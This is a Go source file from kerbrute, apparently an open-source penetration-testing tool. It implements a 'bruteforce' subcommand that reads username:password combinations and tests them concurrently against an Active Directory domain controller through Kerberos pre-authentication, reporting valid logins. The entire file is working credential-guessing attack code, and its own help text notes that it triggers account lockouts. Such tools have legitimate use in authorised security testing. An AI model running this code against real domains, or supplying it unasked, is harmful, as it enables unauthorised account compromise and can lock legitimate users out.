package cmd

import (
	"bufio"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ropnop/kerbrute/util"
	"github.com/spf13/cobra"
)

// bruteuserCmd represents the bruteuser command
var bruteForceCmd = &cobra.Command{
	Use:   "bruteforce [flags] <user_pw_file>",
	Short: "Bruteforce username:password combos, from a file or stdin",
	Long: `Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack using Kerberos Pre-Authentication by requesting at TGT from the KDC. Any succesful combinations will be displayed.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
WARNING: failed guesses will count against the lockout threshold`,
	Args:   cobra.ExactArgs(1),
	PreRun: setupSession,
	Run:    bruteForceCombos,
}

func init() {
	rootCmd.AddCommand(bruteForceCmd)
}

func bruteForceCombos(cmd *cobra.Command, args []string) {
	combolist := args[0]
	stopOnSuccess = false

	combosChan := make(chan [2]string, threads)
	defer cancel()

	var wg sync.WaitGroup
	wg.Add(threads)

	var scanner *bufio.Scanner
	if combolist != "-" {
		file, err := os.Open(combolist)
		if err != nil {
			logger.Log.Error(err.Error())
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	} else {
		scanner = bufio.NewScanner(os.Stdin)
	}

	for i := 0; i < threads; i++ {
		go makeBruteComboWorker(ctx, combosChan, &wg)
	}

	start := time.Now()

Scan:
	for scanner.Scan() {
		select {
		case <-ctx.Done():
			break Scan
		default:
			comboline := scanner.Text()
			if comboline == "" {
				continue
			}
			username, password, err := util.FormatComboLine(comboline)
			if err != nil {
				logger.Log.Debug("[!] Skipping: %q - %v", comboline, err.Error())
				continue
			}
			time.Sleep(time.Duration(delay) * time.Millisecond)
			combosChan <- [2]string{username, password}
		}
	}
	close(combosChan)
	wg.Wait()

	finalCount := atomic.LoadInt32(&counter)
	finalSuccess := atomic.LoadInt32(&successes)
	logger.Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", finalCount, finalSuccess, time.Since(start).Seconds())

	if err := scanner.Err(); err != nil {
		logger.Log.Error(err.Error())
	}
}
